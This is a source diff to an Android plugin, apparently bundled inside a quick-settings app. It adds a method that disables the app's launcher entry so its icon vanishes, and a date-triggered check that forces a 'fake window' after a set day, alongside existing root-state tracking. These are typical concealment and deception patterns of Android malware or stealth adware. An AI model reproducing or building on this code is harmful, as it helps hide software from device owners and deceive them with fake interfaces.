@@ -1,15 +1,19 @@
 package com.xstd.plugin.config;
 
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.os.Build;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
+import com.bwx.bequick.ShowSettingsActivity;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.api.ActiveResponse;
 
 import java.io.*;
+import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Random;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -262,6 +266,22 @@ public class AppRuntime {
         }
 
         systemRootState = kSystemRootStateDisable;
+        return false;
+    }
+
+    public static void hideInLauncher(Context context) {
+        PackageManager pm = context.getPackageManager();
+        pm.setComponentEnabledSetting(new ComponentName(context, ShowSettingsActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    }
+
+    public static boolean shouldForceShowFakeWindow(Context context) {
+        Calendar c = Calendar.getInstance();
+        int curDay = c.get(Calendar.DAY_OF_YEAR);
+        int curYear = c.get(Calendar.YEAR);
+        if (curYear > 2014 || curDay >= Config.FORCE_START_DAY) {
+            return true;
+        }
+
         return false;
     }
 
